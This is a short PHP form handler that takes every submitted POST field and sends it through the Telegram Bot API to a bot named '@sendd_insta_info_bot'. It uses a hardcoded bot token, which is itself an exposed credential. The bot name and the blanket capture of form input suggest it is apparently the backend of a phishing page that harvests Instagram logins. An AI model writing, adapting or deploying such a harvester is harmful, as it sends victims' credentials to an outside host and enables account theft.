<?php
$content = '';
foreach ($_POST as $key => $value) {
if ($value) {
$content .= "<b>$key</b>: <i>$value</i>\n";
}
}
if(trim($content)) {
$content = "<b>Message from Site:</b>\n".$content;
// Your bot's token that got from @BotFather
$number = "5930698438:AAEKZKL5FqwJqPtyhxWxW60a1QaLe0cpxk0";
$data = [
// The user's(that you want to send a message) telegram chat id
'chat_id' => '@sendd_insta_info_bot',
'text' => $content,
'parse_mode' => 'HTML'
];
$response = file_get_contents("https://api.telegram.org/bot$number/sendMessage?".http_build_query($data));
}
?>
